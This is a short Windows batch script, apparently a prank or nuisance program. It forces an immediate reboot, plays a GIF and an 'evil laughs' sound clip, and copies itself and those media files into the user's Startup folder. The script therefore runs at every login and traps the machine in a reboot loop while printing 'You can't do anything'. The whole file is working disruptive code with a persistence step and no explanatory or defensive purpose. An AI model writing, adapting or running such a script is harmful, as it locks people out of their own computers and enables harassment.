ECHO OFF
cls
setlocal enabledelayedexpansion
shutdown.exe /r /f /t 8
start "iexplore.exe" "%cd%\tumblr_nhbs6gQGTI1snusg4o2_500.gif"
start "wmplayer.exe" "%cd%\Evil_Laughs-Mike_Koenig-933903605.mp3"
copy "%cd%\Batch12.bat"  "C:\Users\wipro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
copy "%cd%\Evil_Laughs-Mike_Koenig-933903605.mp3"  "C:\Users\wipro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
copy "%cd%\tumblr_nhbs6gQGTI1snusg4o2_500.gif"  "C:\Users\wipro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
echo You can't do anything
color 0a
ping 127.0.0.1 -n 8 >NUL
taskkill /im iexplore.exe /f
taskkill /IM wmplayer.exe /f
pause